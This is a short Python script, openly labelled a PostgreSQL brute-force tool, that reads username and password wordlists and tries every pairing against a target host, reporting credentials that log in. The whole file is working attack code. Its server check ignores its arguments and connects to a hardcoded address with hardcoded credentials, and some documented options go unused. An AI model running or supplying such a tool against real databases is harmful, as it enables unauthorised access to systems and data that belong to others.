#!/usr/bin/python3
''' Postgress bruteforce script.

A script for bruteforcing postgress

Test with the following commandline
python3 postgress_brute.py 192.168.2.5  users.txt passwords.txt
'''
import psycopg2
import sys
from time import sleep


def execute_scan(host, userfile, passwordfile, port, connect_timeout, ssl):
    '''Execute the bruteforce scan
    :param str host: hosts (IP addresses, hostnames) comma separated
    :param str userfile: filename with usernames
    :param str passwordfile: filename with passwords
    :param int port : port number
    :param bool ssl: bool to set ssl
    :param bool use_subset: bool for subset of lists and slow connection
    '''

    # connect_timeout = 2
    # read_timeout = 2

    try:  # exceptions with files
        # open the Userfile in users list
        users = []
        with open(userfile) as file:
            for line in file:
                users.append(line.strip())

        passwords = []
        with open(passwordfile) as file:
            for line in file:
                passwords.append(line.strip())
    except Exception as FileError:
        print(FileError)

    login_postgress(host, users, passwords, port, connect_timeout, ssl)


def check_postgress(host, port, connect_timeout):
    """Function for checking if there is postgress database running."""
    try:
        # connect to the PostgreSQL server
        conn = psycopg2.connect(host="192.168.2.8", user="postgres", password="postgress", port=5432, connect_timeout=1)
       
        if conn is not  None:
            conn.close()
            return True
    except (Exception, psycopg2.DatabaseError) as error:
        # print(error)
        if 'password authentication failed' in str(error):
            return True
        else:
            return False


def login_postgress(host, users, passwords, port, connect_timeout, ssl):
    """Function for logging in to postgress."""
    for user in users:
        for password in passwords:
            sleep(1)
            try:
                # connect to the PostgreSQL server
                # print('Connecting to the PostgreSQL database...')
                print(f'Trying with {user}:{password} on {host}')
                conn = psycopg2.connect(host=host, user=user, password=password, port=port, connect_timeout=connect_timeout)
                # conn = psycopg2.connect(host="192.168.2.8", port=5432, connect_timeout=1)

                if conn is not None:
                    print(f'connected with {user}:{password} on {host}')
                    conn.close()
            except (Exception, psycopg2.DatabaseError) as error:
                # print(error)
                if 'password authentication failed' in str(error):
                    print('wrong userid and password')
                elif 'Connection refused' in str(error):
                    print('Connection refused')
                    break
                else:
                    print(error)
                    break
        else:
            continue
        break


if len(sys.argv) != 4:
    print("Not enough arguments:\n" +
          'Usage: postgress_brute.py target userfile passfile')
else:
    host = sys.argv[1]
    users = sys.argv[2]
    passw = sys.argv[3]
    ssl = False
    if check_postgress(host, 5432, 3):
        print('postgress available continue with bruteforcing')
        execute_scan(host, users, passw, 5432, 1, ssl)
    else:
        print('No postgress server available')
